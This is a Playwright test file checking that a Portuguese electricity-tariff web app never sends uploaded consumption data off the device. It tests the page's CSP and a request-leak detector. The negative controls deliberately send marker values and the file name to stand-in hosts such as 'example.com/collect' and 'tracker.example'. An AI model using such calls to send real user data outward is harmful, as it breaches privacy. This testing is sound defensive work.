import { expect, test } from '@playwright/test';

import { YEAR_LEAK_NEEDLES } from '../src/testing/synthetic-fixtures';
import { YEAR_FILE, calculateWith, expectResults, upload } from './helpers';
import { findLeaks, recordRequests, type RecordedRequest } from './privacy-detector';

/**
 * Privacy invariant: consumption data never leaves the device. The year fixture carries unique
 * marker kW values; no request from the page or its worker may carry them or the file name, and
 * every request must be a same-origin GET without a body.
 */
const NEEDLES = [...YEAR_LEAK_NEEDLES, YEAR_FILE];

test.describe('privacy', () => {
  test('uploading and computing the synthetic year sends no consumption data', async ({ page, baseURL }) => {
    const origin = new URL(baseURL!).origin;
    const recorder = recordRequests(page);
    const violations: string[] = [];
    page.on('console', (message) => {
      if (/Content Security Policy/i.test(message.text())) {
        violations.push(message.text());
      }
    });

    await page.goto('/');
    await upload(page, YEAR_FILE);
    await calculateWith(page, 'EDP Comercial Eletricidade');
    await expectResults(page);
    // Interact with the result and visit the sources page, so their traffic is covered too.
    await page.getByLabel('Comparar a sua tarifa com').selectOption({ index: 2 });
    await page.getByRole('link', { name: 'Fontes e pressupostos' }).click();
    await expect(page.getByRole('heading', { level: 1, name: 'Fontes e pressupostos' })).toBeVisible();
    await expect(page.getByTestId('sources-offers')).toBeVisible();
    await recorder.settle();

    const urls = recorder.requests.map((request) => request.url);
    // The worker's own data fetches are recorded: the OMIE year file is only requested by the worker.
    expect(urls.some((url) => url.includes('worker'))).toBe(true);
    expect(urls.some((url) => url.endsWith('/data/omie/2025.json'))).toBe(true);
    expect(page.workers().length).toBeGreaterThan(0);

    expect(findLeaks(recorder.requests, origin, NEEDLES)).toEqual([]);
    expect(violations).toEqual([]);
  });

  test('index.html carries the CSP and loads nothing from other origins', async ({ page, baseURL }) => {
    const origin = new URL(baseURL!).origin;
    await page.goto('/');
    const csp = await page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content');
    expect(csp).toContain("connect-src 'self'");
    expect(csp).toContain("script-src 'self'");
    expect(csp).toContain("font-src 'self'");
    expect(csp).not.toMatch(/https?:/);

    const external = await page.evaluate((own) => {
      const urls = [
        ...[...document.querySelectorAll('script[src]')].map((el) => (el as HTMLScriptElement).src),
        ...[...document.querySelectorAll('link[href]')].map((el) => (el as HTMLLinkElement).href),
      ];
      return urls.filter((url) => new URL(url).origin !== own);
    }, origin);
    expect(external).toEqual([]);

    // The policy is enforced: a third-party connection is refused before it reaches the network.
    const outcome = await page.evaluate(() =>
      fetch('https://example.com/collect', { method: 'POST', body: '9,871' }).then(
        () => 'sent',
        () => 'blocked',
      ),
    );
    expect(outcome).toBe('blocked');
  });

  test('negative control: the detector flags a deliberate leak', async ({ page, baseURL }) => {
    const origin = new URL(baseURL!).origin;
    const recorder = recordRequests(page);
    await page.goto('/');
    await page.evaluate(async (fileName) => {
      const swallow = () => undefined;
      await fetch(`/data/catalogue.json?v=${encodeURIComponent('9,871')}`).catch(swallow);
      await fetch('/data/upload', { method: 'POST', body: '9.874' }).catch(swallow);
      await fetch('/data/catalogue.json', { headers: { 'x-file': fileName } }).catch(swallow);
    }, YEAR_FILE);
    await recorder.settle();

    const leaks = findLeaks(recorder.requests, origin, NEEDLES);
    const reasons = leaks.map((leak) => leak.reason);
    expect(reasons).toContain('URL contains "9%2C871"');
    expect(reasons).toContain('method POST');
    expect(reasons).toContain('request has a body');
    expect(reasons).toContain('body contains "9.874"');
    expect(reasons).toContain(`header x-file contains "${YEAR_FILE}"`);
  });

  test('negative control: the detector flags third-party origins and sockets', () => {
    const origin = 'http://127.0.0.1:4510';
    const clean: RecordedRequest = {
      url: `${origin}/data/omie/2025.json`,
      method: 'GET',
      headers: { accept: '*/*' },
      body: null,
    };
    expect(findLeaks([clean], origin, NEEDLES)).toEqual([]);

    const leaks = findLeaks(
      [
        { ...clean, url: 'https://tracker.example/p.gif' },
        { ...clean, url: `ws://127.0.0.1:4510/socket`, method: 'WEBSOCKET', body: '{"kw":9.872}' },
        { ...clean, url: `${origin}/x?name=synthetic-year-2025.xlsx` },
      ],
      origin,
      NEEDLES,
    ).map((leak) => leak.reason);
    expect(leaks).toContain('third-party origin https://tracker.example');
    expect(leaks).toContain('method WEBSOCKET');
    expect(leaks).toContain('body contains "9.872"');
    expect(leaks).toContain(`URL contains "${YEAR_FILE}"`);
  });
});
